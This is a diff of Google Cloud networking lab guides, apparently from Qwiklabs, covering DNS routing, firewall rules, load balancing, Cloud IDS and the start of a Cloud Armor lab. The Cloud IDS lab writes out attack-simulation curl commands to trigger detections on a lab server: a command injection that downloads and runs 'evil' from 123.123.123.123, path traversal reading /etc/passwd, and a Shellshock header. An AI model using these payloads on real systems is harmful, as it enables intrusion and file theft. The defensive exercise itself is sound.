@@ -817,7 +817,7 @@ It takes a few moments to provision and connect to the environment. When you are
 gcloud auth list
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -839,7 +839,7 @@ Credentialed accounts:
 gcloud config list project
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -869,7 +869,7 @@ Ensure that the Compute and the Cloud DNS APIs are enabled. In this section, you
 gcloud services enable compute.googleapis.com
 ```
 
-Copied!
+
 
 This command can take a few minutes to complete.
 
@@ -881,7 +881,7 @@ This command can take a few minutes to complete.
 gcloud services enable dns.googleapis.com
 ```
 
-Copied!
+
 
 This command can take a few minutes to complete.
 
@@ -893,7 +893,7 @@ This command can take a few minutes to complete.
 gcloud services list | grep -E 'compute|dns'
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -920,7 +920,7 @@ gcloud compute firewall-rules create fw-default-iapproxy \
 --source-ranges=35.235.240.0/20
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -942,7 +942,7 @@ DISABLED: False
 gcloud compute firewall-rules create allow-http-traffic --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:80 --source-ranges=0.0.0.0/0 --target-tags=http-server
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -976,7 +976,7 @@ Now that the APIs are enabled, and the firewall rules are in place, the next ste
 gcloud compute instances create us-client-vm --machine-type=e2-micro --zone "Zone 1"
 ```
 
-Copied!
+
 
 This command can take a few minutes to complete. Please wait for a "Created" message before moving to the next step. Note that you may see a different zone in gcloud than in the sample output shown below.
 
@@ -1001,7 +1001,7 @@ STATUS: RUNNING
 gcloud compute instances create europe-client-vm --machine-type=e2-micro --zone ""Zone 2""
 ```
 
-Copied!
+
 
 Note that you may see a different zone in gcloud than in the sample output shown below.
 
@@ -1026,7 +1026,7 @@ STATUS: RUNNING
 gcloud compute instances create asia-client-vm --machine-type=e2-micro --zone ""Zone 3""
 ```
 
-Copied!
+
 
 Note that you may see a different zone in gcloud than in the sample output shown below.
 
@@ -1074,7 +1074,7 @@ gcloud compute instances create us-web-vm \
  systemctl restart apache2'
 ```
 
-Copied!
+
 
 Note that you may see a different zone in gcloud than in the sample output shown below.
 
@@ -1110,7 +1110,7 @@ gcloud compute instances create europe-web-vm \
  systemctl restart apache2'
 ```
 
-Copied!
+
 
 Note that you may see a different zone in gcloud than in the sample output shown below.
 
@@ -1143,7 +1143,7 @@ Before you configure Cloud DNS, note the Internal IP addresses of the web server
 export US_WEB_IP=$(gcloud compute instances describe us-web-vm --zone="Zone 1" --format="value(networkInterfaces.networkIP)")
 ```
 
-Copied!
+
 
 1. Command to save the IP address for the VM in Europe:
 
@@ -1151,7 +1151,7 @@ Copied!
 export EUROPE_WEB_IP=$(gcloud compute instances describe europe-web-vm --zone="Zone 2" --format="value(networkInterfaces.networkIP)")
 ```
 
-Copied!
+
 
 #### Task 6. Create the private zone
 
@@ -1165,7 +1165,7 @@ For this lab, use the `example.com` domain name for the Cloud DNS zone.
 gcloud dns managed-zones create example --description=test --dns-name=example.com --networks=default --visibility=private
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -1188,7 +1188,7 @@ gcloud dns record-sets create geo.example.com \
 --routing-policy-data=""Region 1"=$US_WEB_IP;"Region 2"=$EUROPE_WEB_IP"
 ```
 
-Copied!
+
 
 You are creating an A record with a Time to Live (TTL) of 5 seconds. The policy type is GEO, and the `routing_policy_data` field accepts a semicolon-delimited list of the format `${region}:${rrdata},${rrdata}`.
 
@@ -1209,7 +1209,7 @@ DATA: "filled at lab start": 10.142.0.3; "Region 2": 10.154.0.3
 gcloud dns record-sets list --zone=example
 ```
 
-Copied!
+
 
 The output shows that an A record with a TTL of 5 is created for `geo.example.com`, and the data matches our server set up in each region.
 
@@ -1257,7 +1257,7 @@ Since you are using a Geolocation policy, the expected result is that:
 gcloud compute ssh europe-client-vm --zone "Zone 2" --tunnel-through-iap
 ```
 
-Copied!
+
 
 1. Follow prompts to SSH into the machine. When asked to enter the passphrase, leave the field blank and press the Enter key twice.
 
@@ -1286,7 +1286,7 @@ user_name@europe-client-vm:~$
 for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done
 ```
 
-Copied!
+
 
 Since the TTL on the DNS record is set to 5 seconds, a sleep timer of 6 seconds has been added. The sleep timer will make sure that you get an uncached DNS response for each cURL request. This command will take approximately one minute to complete.
 
@@ -1331,7 +1331,7 @@ Now perform the same test from the client VM in the US.
 gcloud compute ssh us-client-vm --zone "Zone 1" --tunnel-through-iap
 ```
 
-Copied!
+
 
 1. Use the `curl` command to access `geo.example.com`:
 
@@ -1339,7 +1339,7 @@ Copied!
 for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done
 ```
 
-Copied!
+
 
 1. Now analyze the output to see which server is responding to the request. The client should always receive a response from a server in the client's region. The expected output is "Page served from: `<filled at lab start>`".
 2. Once you have run the test multiple times, exit the client VM in the US by typing "`exit`" in the VM's command prompt.
@@ -1358,7 +1358,7 @@ In this section, you will resolve the `geo.example.com` domain from the client V
 gcloud compute ssh asia-client-vm --zone <SELECTED-ZONE> --tunnel-through-iap
 ```
 
-Copied!
+
 
 1. Then access geo.example.com:
 
@@ -1366,7 +1366,7 @@ Copied!
 for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done
 ```
 
-Copied!
+
 
 1. Analyze the output to see which server is responding to the request. Since there is no policy item for any of the Asia regions, Cloud DNS will direct the client to the nearest server.
 2. Once you have run the test multiple times, exit the client VM in Asia by typing "`exit`" in the VM's command prompt.
@@ -1401,7 +1401,7 @@ gcloud dns record-sets delete geo.example.com --type=A --zone=example
 gcloud dns managed-zones delete example
 ```
 
-Copied!
+
 
 #### Congratulations
 
@@ -2114,7 +2114,7 @@ spoke1-vm and spoke2-vm are in two different VPCs. Let us test the connectivity 
 ping <internal IP address of spoke1-vm>
 ```
 
-Copied!
+
 
 Notice how the ping fails. This should execute and display 100% packet loss. Press **Ctrl+C** to stop the command.
 
@@ -2124,7 +2124,7 @@ Notice how the ping fails. This should execute and display 100% packet loss. Pre
 ping <internal IP address of spoke2-vm>
 ```
 
-Copied!
+
 
 Notice how the ping fails. This should execute and display 100% packet loss. Press **Ctrl+C** to stop the command.
 
@@ -2169,7 +2169,7 @@ This task has been performed for you at the start of this lab. You will need to 
 ping -c 3 <internal IP address of spoke2-vm>
 ```
 
-Copied!
+
 
 1. Repeat the previous steps for **spoke2-vm**.
 
@@ -2268,7 +2268,7 @@ In this task, you verify that the global HTTP load balancer is deployed. The HTT
 gcloud compute backend-services get-health web-backend --global
 ```
 
-Copied!
+
 
 **Note:** Rerun this command and wait until this command returns that three instances are HEALTHY. You can also monitor it in the console (**Navigation menu > View All Products > Network services > Load balancing**).
 
@@ -2278,7 +2278,7 @@ Copied!
 gcloud compute forwarding-rules describe web-rule --global
 ```
 
-Copied!
+
 
 1. Copy the value for the **IPAddress** property.
 
@@ -2302,7 +2302,7 @@ Keep refreshing the page until you see a page with a message similar to this:
 while true; do curl -m1 {IP_ADDRESS}; done
 ```
 
-Copied!
+
 
 The responses will be from backends that have been created in different zones.
 
@@ -2332,7 +2332,7 @@ The responses will be from backends that have been created in different zones.
 curl -m1 {IP_ADDRESS}
 ```
 
-Copied!
+
 
 The output should look similar to:
 
@@ -2392,7 +2392,7 @@ Wait for the policy to be created before moving to the next step.
 curl -m1 {IP_ADDRESS}
 ```
 
-Copied!
+
 
 The output should look as follows.
 
@@ -2528,7 +2528,7 @@ It takes a few moments to provision and connect to the environment. When you are
 gcloud auth list
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -2550,7 +2550,7 @@ Credentialed accounts:
 gcloud config list project
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -2579,7 +2579,7 @@ In this task, you create an automatic VPC network and custom VPC network, and so
 gcloud compute networks create mynetwork --subnet-mode=auto
 ```
 
-Copied!
+
 
 **Note:** When an auto mode VPC network is created, one subnet from each region is automatically created within it. These automatically created subnets use a set of predefined IP ranges that fit within the 10.128.0.0/9 CIDR block.
 
@@ -2592,7 +2592,7 @@ gcloud compute networks create privatenet \
 --subnet-mode=custom
 ```
 
-Copied!
+
 
 1. To create a custom subnet in the privatenet network, run the following command:
 
@@ -2602,7 +2602,7 @@ gcloud compute networks subnets create privatesubnet \
 --range=10.0.0.0/24 --enable-private-ip-google-access
 ```
 
-Copied!
+
 
 1. To create some instances to use later for testing in all networks, run these commands:
 
@@ -2612,7 +2612,7 @@ gcloud compute instances create default-vm-1 \
 --zone=Zone 1 --network=default
 ```
 
-Copied!
+
 
 ```
 gcloud compute instances create mynet-vm-1 \
@@ -2620,7 +2620,7 @@ gcloud compute instances create mynet-vm-1 \
 --zone=Zone 1 --network=mynetwork
 ```
 
-Copied!
+
 
 ```
 gcloud compute instances create mynet-vm-2 \
@@ -2628,7 +2628,7 @@ gcloud compute instances create mynet-vm-2 \
 --zone=Zone 2 --network=mynetwork
 ```
 
-Copied!
+
 
 ```
 gcloud compute instances create privatenet-bastion \
@@ -2636,7 +2636,7 @@ gcloud compute instances create privatenet-bastion \
 --zone=Zone  --subnet=privatesubnet --can-ip-forward
 ```
 
-Copied!
+
 
 ```
 gcloud compute instances create privatenet-vm-1 \
@@ -2644,7 +2644,7 @@ gcloud compute instances create privatenet-vm-1 \
 --zone=Zone  --subnet=privatesubnet
 ```
 
-Copied!
+
 
 Click *Check my progress* to verify the objective.
 
@@ -2716,7 +2716,7 @@ You will now try to SSH into an instance from the Cloud Shell.
 gcloud compute ssh qwiklabs@mynet-vm-2 --zone Zone 2
 ```
 
-Copied!
+
 
 If prompted, type `Y` and press **Enter** twice to proceed.
 
@@ -2744,7 +2744,7 @@ ip=$(curl -s https://api.ipify.org)
 echo "My External IP address is: $ip"
 ```
 
-Copied!
+
 
 **Sample output** (your IP will be different):
 
@@ -2761,7 +2761,7 @@ mynetwork-ingress-allow-ssh-from-cs \
 --rules tcp:22 --source-ranges $ip --target-tags=lab-ssh
 ```
 
-Copied!
+
 
 This firewall rule is also given a target tag of *lab-ssh*, which means it applies only to instances that are tagged with the lab-ssh tag.
 
@@ -2786,7 +2786,7 @@ gcloud compute instances add-tags mynet-vm-1 \
     --tags lab-ssh
 ```
 
-Copied!
+
 
 ##### Stateful firewalls
 
@@ -2798,7 +2798,7 @@ In VPC networks, firewall rules are stateful. So for each initiated connection t
 gcloud compute ssh qwiklabs@mynet-vm-2 --zone Zone 2
 ```
 
-Copied!
+
 
 It will take several seconds to negotiate the SSH keys, but the connection should succeed. This verifies that the firewall rule is allowing the traffic.
 
@@ -2809,7 +2809,7 @@ It will take several seconds to negotiate the SSH keys, but the connection shoul
  gcloud compute ssh qwiklabs@mynet-vm-1 --zone Zone 1
 ```
 
-Copied!
+
 
 This connection should also succeed because the **mynet-vm-1** instance is in the same network, and the firewall rule you created is allowing access to all instances.
 
@@ -2821,7 +2821,7 @@ This connection should also succeed because the **mynet-vm-1** instance is in th
  ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
 ```
 
-Copied!
+
 
 The ping command will not succeed. Even though the **mynet-vm-1** and the **mynet-vm-2** instances are in the same VPC network, all traffic is blocked by default unless there is a firewall rule allowing it.
 
@@ -2836,7 +2836,7 @@ mynetwork --action ALLOW --direction INGRESS --rules icmp \
 --source-ranges 10.128.0.0/9
 ```
 
-Copied!
+
 
 **Note:** This firewall rule does not use a target-tag and therefore applies to all instances in the network by default. There is no need to tag any instances for this firewall to take effect. This kind of firewall rule is useful if all instances in a network need the same rule, but should also be used with caution because they affect all instances.
 
@@ -2846,7 +2846,7 @@ Copied!
  ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
 ```
 
-Copied!
+
 
 Notice that the hostname *mynet-vm-2* resolved to the internal IP address of the instance. The internal IP will start with *10.132.0* (for example, *10.132.0.2*). Google Cloud resolves internal hostnames for you.
 
@@ -2860,7 +2860,7 @@ Notice that the hostname *mynet-vm-2* resolved to the internal IP address of the
  ping 
 ```
 
-Copied!
+
 
 This should **NOT** work. When you ping the external IP address, the connection goes through the internet gateway, which causes the request to be NATed. The request is now coming from the *external* IP address of the mynet-vm-1 instance. The firewall rule is to only allow ICMP requests that come from *internal* IP addresses.
 
@@ -2886,7 +2886,7 @@ If not connected, use the following command to reconnect:
  gcloud compute ssh qwiklabs@mynet-vm-1 --zone Zone 1
 ```
 
-Copied!
+
 
 1. Verify that you can still ping the **mynet-vm-2** instance:
 
@@ -2894,7 +2894,7 @@ Copied!
  ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
 ```
 
-Copied!
+
 
 1. Press **Ctrl+C** to stop ping.
 2. Switch to your second Cloud Shell window (or open a new one).
@@ -2907,7 +2907,7 @@ mynetwork --action DENY --direction INGRESS --rules icmp \
 --priority 500
 ```
 
-Copied!
+
 
 1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance, and try to ping the **mynet-vm-2** instance:
 
@@ -2915,7 +2915,7 @@ Copied!
  ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
 ```
 
-Copied!
+
 
 It should no longer work. This new rule has a priority of 500, where the allow rule is 1,000.
 
@@ -2931,7 +2931,7 @@ mynetwork-ingress-deny-icmp-all \
 --priority 2000
 ```
 
-Copied!
+
 
 1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance, and try to ping the **mynet-vm-2** instance again:
 
@@ -2939,7 +2939,7 @@ Copied!
  ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
 ```
 
-Copied!
+
 
 This time it will work because the deny rule has a lower priority, so the allow rule is the first matching rule.
 
@@ -2956,7 +2956,7 @@ gcloud compute firewall-rules list \
 --filter="network:mynetwork"
 ```
 
-Copied!
+
 
 Currently, the VMs are still able to ping each other because the rule that denies ICMP has a higher priority than the allow ICMP rule.
 
@@ -2971,7 +2971,7 @@ mynetwork --action DENY --direction EGRESS --rules icmp \
 --priority 10000
 ```
 
-Copied!
+
 
 1. List all the current firewall rules again:
 
@@ -2980,7 +2980,7 @@ gcloud compute firewall-rules list \
 --filter="network:mynetwork"
 ```
 
-Copied!
+
 
 Notice that the egress rule priority is set to 10,000, which is much higher than the rules created earlier.
 
@@ -2990,7 +2990,7 @@ Notice that the egress rule priority is set to 10,000, which is much higher than
  ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal
 ```
 
-Copied!
+
 
 **It should no longer work**. Even though the egress rule has a much higher priority of 10,000, it is still blocking traffic. This is because for traffic to be allowed, there must be both an ingress and egress rule allowing that traffic. The priority of ingress rules does not affect the priority of egress rules.
 
@@ -3106,7 +3106,7 @@ It takes a few moments to provision and connect to the environment. When you are
 gcloud auth list
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -3128,7 +3128,7 @@ Credentialed accounts:
 gcloud config list project
 ```
 
-Copied!
+
 
 **Output:**
 
@@ -3158,7 +3158,7 @@ In this task you set the project ID variable and then enable the APIs required f
 export PROJECT_ID=$(gcloud config get-value project | sed '2d')
 ```
 
-Copied!
+
 
 1. Enable the Service Networking API:
 
@@ -3167,7 +3167,7 @@ gcloud services enable servicenetworking.googleapis.com \
     --project=$PROJECT_ID
 ```
 
-Copied!
+
 
 If prompted to authorize the command, click **Authorize**.
 
@@ -3178,7 +3178,7 @@ gcloud services enable ids.googleapis.com \
     --project=$PROJECT_ID
 ```
 
-Copied!
+
 
 1. Enable the Cloud Logging API:
 
@@ -3187,7 +3187,7 @@ gcloud services enable logging.googleapis.com \
     --project=$PROJECT_ID
 ```
 
-Copied!
+
 
 Click *Check my progress* to verify the objective.
 
@@ -3210,7 +3210,7 @@ gcloud compute networks create cloud-ids \
 --subnet-mode=custom
 ```
 
-Copied!
+
 
 If prompted to authorize the command, click **Authorize**.
 
@@ -3223,7 +3223,7 @@ gcloud compute networks subnets create cloud-ids-useast1 \
 --region=us-east1
 ```
 
-Copied!
+
 
 1. Configure private services access:
 
@@ -3237,7 +3237,7 @@ gcloud compute addresses create cloud-ids-ips \
 --network=cloud-ids
 ```
 
-Copied!
+
 
 1. Create a private connection:
 
@@ -3249,7 +3249,7 @@ gcloud services vpc-peerings connect \
 --project=$PROJECT_ID
 ```
 
-Copied!
+
 
 Click *Check my progress* to verify the objective.
 
@@ -3275,7 +3275,7 @@ gcloud ids endpoints create cloud-ids-east1 \
 --async
 ```
 
-Copied!
+
 
 1. Verify that the Cloud IDS endpoint is initiated:
 
@@ -3283,7 +3283,7 @@ Copied!
 gcloud ids endpoints list --project=$PROJECT_ID
 ```
 
-Copied!
+
 
 If the message **Would you like to enable and retry** appears, press **Y**.
 
@@ -3329,7 +3329,7 @@ gcloud compute firewall-rules create allow-http-icmp \
 --target-tags=server
 ```
 
-Copied!
+
 
 1. Create the allow-iap-proxy rule:
 
@@ -3343,7 +3343,7 @@ gcloud compute firewall-rules create allow-iap-proxy \
 --source-ranges=35.235.240.0/20
 ```
 
-Copied!
+
 
 Click *Check my progress* to verify the objective.
 
@@ -3359,7 +3359,7 @@ gcloud compute routers create cr-cloud-ids-useast1 \
 --network=cloud-ids
 ```
 
-Copied!
+
 
 1. To configure a Cloud NAT, run the following command:
 
@@ -3371,7 +3371,7 @@ gcloud compute routers nats create nat-cloud-ids-useast1 \
 --nat-all-subnet-ip-ranges
 ```
 
-Copied!
+
 
 Click *Check my progress* to verify the objective.
 
@@ -3401,7 +3401,7 @@ gcloud compute instances create server \
 --boot-disk-size=10GB
 ```
 
-Copied!
+
 
 This command creates a Debian server in us-east1 and installs a simple web service.
 
@@ -3419,7 +3419,7 @@ gcloud compute instances create attacker \
 --boot-disk-size=10GB
 ```
 
-Copied!
+
 
 This command prepares a Debian server in us-east1 to use as your client.
 
@@ -3439,7 +3439,7 @@ In this procedure, you validate your server and then create a benign malware pay
 gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap
 ```
 
-Copied!
+
 
 This command will prompt you through a series of steps to create an ssh key and the required directories.
 
@@ -3458,7 +3458,7 @@ In this procedure, you check the status of your web service server. You create a
 sudo systemctl status nginx
 ```
 
-Copied!
+
 
 The output should be similar to this:
 
@@ -3487,7 +3487,7 @@ Command Output
 cd /var/www/html/
 ```
 
-Copied!
+
 
 1. Create a benign malware file on the web server. Run the following Linux command to create a text file:
 
@@ -3495,7 +3495,7 @@ Copied!
 sudo touch eicar.file
 ```
 
-Copied!
+
 
 1. Add the following content to the newly created file:
 
@@ -3503,7 +3503,7 @@ Copied!
 echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
 ```
 
-Copied!
+
 
 1. Exit the server VM shell and return to Cloud Shell:
 
@@ -3511,7 +3511,7 @@ Copied!
 exit
 ```
 
-Copied!
+
 
 #### Task 6. Create a Cloud IDS packet mirroring policy
 
@@ -3525,7 +3525,7 @@ As mentioned earlier, the Cloud IDS endpoint creation takes some time. Before yo
 gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
 ```
 
-Copied!
+
 
 The output should be similar to this:
 
@@ -3544,7 +3544,7 @@ export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us
 echo $FORWARDING_RULE
 ```
 
-Copied!
+
 
 The output should be similar to this:
 
@@ -3566,7 +3566,7 @@ gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
 --mirrored-subnets=cloud-ids-useast1
 ```
 
-Copied!
+
 
 Click *Check my progress* to verify the objective.
 
@@ -3580,7 +3580,7 @@ Create and attach the packet mirroring policy.
 gcloud compute packet-mirrorings list
 ```
 
-Copied!
+
 
 This gcloud command lists the packet mirroring policies and shows whether they are enabled/disabled.
 
@@ -3605,7 +3605,7 @@ In this task, you establish an SSH connection to your attacked virtual machine a
 gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
 ```
 
-Copied!
+
 
 **Note:** You are now in the shell of your attacker VM and not the Cloud Shell machine.
 
@@ -3617,7 +3617,7 @@ Copied!
 curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
 ```
 
-Copied!
+
 
 **Medium Severity:**
 
@@ -3626,7 +3626,7 @@ curl http://192.168.10.20/?item=../../../../WINNT/win.ini
 curl http://192.168.10.20/eicar.file
 ```
 
-Copied!
+
 
 **High Severity:**
 
@@ -3634,7 +3634,7 @@ Copied!
 curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
 ```
 
-Copied!
+
 
 **Critical Severity:**
 
@@ -3642,7 +3642,7 @@ Copied!
 curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
 ```
 
-Copied!
+
 
 1. Exit the attacker virtual machine shell and return to Cloud Shell:
 
@@ -3650,7 +3650,7 @@ Copied!
 exit
 ```
 
-Copied!
+
 
 #### Task 8. Review threats detected by Cloud IDS
 
@@ -3875,7 +3875,7 @@ You create a VM called *utility-vm* in *subnet-a* of the *my-internal-app* netwo
 curl 10.10.20.2
 ```
 
-Copied!
+
 
 The output is shown below. Note that the server location is set to `Zone 1`.
 
@@ -3890,7 +3890,7 @@ The output is shown below. Note that the server location is set to `Zone 1`.
 curl 10.10.30.2
 ```
 
-Copied!
+
 
 The output is shown below. Note that the server location is set to `Zone 2`.
 
@@ -3929,7 +3929,7 @@ Submit
 exit
 ```
 
-Copied!
+
 
 Click **Check my progress** to verify the objective.
 
@@ -4070,7 +4070,7 @@ routeRules:
          weight: 30
 ```
 
-Copied!
+
 
 1. Click **Done**.
 
@@ -4127,7 +4127,7 @@ Verify that the *my-ilb* IP address forwards most of the traffic to the *blue-se
 curl 10.10.30.5
 ```
 
-Copied!
+
 
 The output should look like this:
 
@@ -4153,7 +4153,7 @@ curl 10.10.30.5
 curl 10.10.30.5
 ```
 
-Copied!
+
 
 Most responses should come from *instance-group-1* in `Zone 1`, which is the blue-service. Fewer responses come from *instance-group-2* in `Zone 2`, which is the green-service. (Recall that you configured the load balancer to route 70% of the traffic to the blue-service.) If you do not see that most responses come from *instance-group-1*, run the commands again.
 
@@ -4197,3 +4197,5483 @@ Correct. When you use an internal IP address to specify the next hop,  the load 
 
 
 ## Caching and Optimizing Load Balancing
+
+### LAB - Defending Edge Cache with Cloud Armor
+
+#### Overview
+
+[Google Cloud Armor](https://cloud.google.com/armor) [edge security policies](https://cloud.google.com/armor/docs/security-policy-overview#edge-policies) allow you to restrict access to cached objects on [Cloud CDN](https://cloud.google.com/cdn) (Content Delivery Network) and Cloud Storage. Edge security policies are deployed and enforced at the outermost perimeter of Google's network, upstream of where the Cloud CDN cache resides. Reasons to do this include ensuring that your users do not access objects in storage buckets from restricted geographies, or ensuring that your media distribution is filtering on the geographies that you have a license to do so.
+
+In this lab you create a Google Cloud Storage bucket, upload an image to it, bind it to a load balancer, and then enable Cloud CDN and Cloud Armor edge security policies on it.
+
+##### What you'll learn
+
+In this lab, you learn how to:
+
+- Set up a Cloud Storage Bucket with cacheable content
+- Create an edge security policy to protect the content
+- Validate that the edge security policy is working as expected
+
+#### Setup and requirements
+
+##### Before you click the Start Lab button
+
+Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources are made available to you.
+
+This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.
+
+To complete this lab, you need:
+
+- Access to a standard internet browser (Chrome browser recommended).
+
+**Note:** Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.
+
+- Time to complete the lab—remember, once you start, you cannot pause a lab.
+
+**Note:** Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.
+
+##### How to start your lab and sign in to the Google Cloud console
+
+1. Click the **Start Lab** button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:
+
+   - The Open Google Cloud console button
+   - Time remaining
+   - The temporary credentials that you must use for this lab
+   - Other information, if needed, to step through this lab
+
+2. Click **Open Google Cloud console** (or right-click and select **Open Link in Incognito Window** if you are running the Chrome browser).
+
+   The lab spins up resources, and then opens another tab that shows the Sign in page.
+
+   ***Tip:\*** Arrange the tabs in separate windows, side-by-side.
+
+   **Note:** If you see the **Choose an account** dialog, click **Use Another Account**.
+
+3. If necessary, copy the **Username** below and paste it into the **Sign in** dialog.
+
+   ```
+   "Username"
+   ```
+
+   
+
+   You can also find the Username in the Lab Details pane.
+
+4. Click **Next**.
+
+5. Copy the **Password** below and paste it into the **Welcome** dialog.
+
+   ```
+   "Password"
+   ```
+
+   
+
+   You can also find the Password in the Lab Details pane.
+
+6. Click **Next**.
+
+   **Important:** You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.
+
+   **Note:** Using your own Google Cloud account for this lab may incur extra charges.
+
+7. Click through the subsequent pages:
+
+   - Accept the terms and conditions.
+   - Do not add recovery options or two-factor authentication (because this is a temporary account).
+   - Do not sign up for free trials.
+
+After a few moments, the Google Cloud console opens in this tab.
+
+**Note:** To access Google Cloud products and services, click the **Navigation menu** or type the service or product name in the **Search** field. ![Navigation menu icon and Search field](images/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D.png)
+
+##### Before you begin
+
+- In Cloud Shell, set your Project ID and create an environment variable for it:
+
+```
+export PROJECT_ID=$(gcloud config get-value project)
+echo $PROJECT_ID
+gcloud config set project $PROJECT_ID
+```
+
+
+
+#### Task 1. Create a Cloud Storage bucket and upload an object
+
+The Cloud Storage bucket will be the origin source for Cloud CDN.
+
+1. In the console, go to **Navigation menu (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D))** > **Cloud Storage** > **Buckets**.
+2. To create a new Cloud Storage bucket, click **CREATE**.
+3. Set the bucket name as `Bucket Name`
+4. Click **Continue**.
+5. For **Location type**, select `Region`, and choose `Bucket Region`
+6. Click **Continue**.
+7. The default storage class for your bucket is `Standard`. Click **Continue**.
+8. Uncheck `Enforce public access prevention on this bucket` checkbox under **Prevent public access**.
+9. Choose **Fine-grained** under **Access Control**.
+10. Click **Continue**.
+11. Click **Create**.
+
+That's it — you've just created a Cloud Storage bucket!
+
+##### Upload an Object to the bucket
+
+Now upload an object into the bucket, which you will use later. By default, Cloud Storage buckets are private. As part of this lab, you will make the object available to the Internet.
+
+1. Run the following command in Cloud Shell, to download an image to Cloud Shell. A Google image from the Google homepage is used for this lab.
+
+```
+wget --output-document google.png https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png
+```
+
+
+
+1. Use the `gsutil cp` command to upload the image from the Cloud Shell to the bucket you created:
+
+```
+gsutil cp google.png gs://Bucket Name
+```
+
+
+
+1. Remove the downloaded image from Cloud Shell:
+
+```
+rm google.png
+```
+
+
+
+1. Locate the object you have uploaded to the bucket by navigating to **Cloud Storage > Buckets > `Bucket Name`**.
+2. Now, click on the three dots on the right side of the object you uploaded and click **Edit access**.
+3. Click on **Add Entry** and set the entity as **Public** from the drop-down list.
+4. Click **Save**.
+
+![Edit access page, which lists the entities and includes the Save and Cancel buttons](images/b7J%2FDa%2FQs1ii9RJbtLB9PEBijeY9rdhukZsgf0V76Y0%3D.png)
+
+Click **Check my progress** to verify the objective.
+
+Create a Cloud Storage Bucket and upload an object
+
+
+
+Check my progress
+
+
+
+#### Task 2. Create a Load Balancer
+
+Cloud CDN and Cloud Armor are components that can be tied to Google's global [Cloud Load Balancing](https://cloud.google.com/load-balancing). In this section, you create an HTTP Load balancer.
+
+1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products > Network services** > **Load Balancing**.
+2. Click **+CREATE LOAD BALANCER**.
+3. Under Type of **load balancer**, select **Application Load Balancer (HTTP/HTTPS)** and click **NEXT**.
+4. Under **Public facing or internal**, select **Public facing (external)** and click **NEXT**.
+5. For **Global or single region deployment**, select **Best for global workloads** and click **NEXT**.
+6. For **Load balancer generation**, select **Global external Application Load Balancer** and click **NEXT**.
+7. Click **CONFIGURE** button.
+8. Name the load balancer as `edge-cache-lb`.
+
+##### Create frontend configuration
+
+To create the frontend configuration:
+
+1. Click on **Frontend configuration**.
+2. For the frontend configuration use HTTP (though HTTPS also works if you have a certificate) and an ephemeral IP address and ensure that you have selected the premium tier network. This is by default.
+3. Click **Done**.
+
+![Frontend configuration page, which includes the load balancer's description](https://cdn.qwiklabs.com/W%2Ftq7MRoTnPDw%2Bvl3uNSZwxbwFEE1txmCee%2FHTIZ8yM%3D)
+
+##### Create backend configuration
+
+To create the backend configuration:
+
+1. Click on **Backend configuration**.
+2. For **Backend services & backend buckets**, click **Create a backend bucket**.
+3. Set the **Backend bucket name** to `lb-backend-bucket`.
+4. In the next field, select the Cloud Storage bucket created earlier by clicking the **Browse** button.
+5. Leave all other values at their defaults.
+6. Click **Create**.
+
+##### Create host and path rules
+
+To create host and path rules:
+
+1. Click on **Routing rules** on the left.
+2. Select **simple host and path rule** under Mode to send any request to the bucket. This is the default option.
+
+##### Review and create the HTTP Load Balancer
+
+To review and create the HTTP Load Balancer:
+
+1. Click on **Review and finalize**.
+2. Review the **Backend services** and **Frontend**.
+3. Click on **Create**.
+
+##### Get Load Balancer IP
+
+To get the Load Balancer IP from the console:
+
+- Click the load balancer name in the list of load balancers for the project. Note the IPv4 address of the load balancer for the next task. Refer to it as `[LOAD_BALANCER_IP]`.
+
+![The Details page, which includes the highlighted IP:Port address](https://cdn.qwiklabs.com/gEIAdRhQ0Wllm2LutPBRlMAcAgXNbrZH%2FUMny9AgaGI%3D)
+
+##### Query the Load Balancer
+
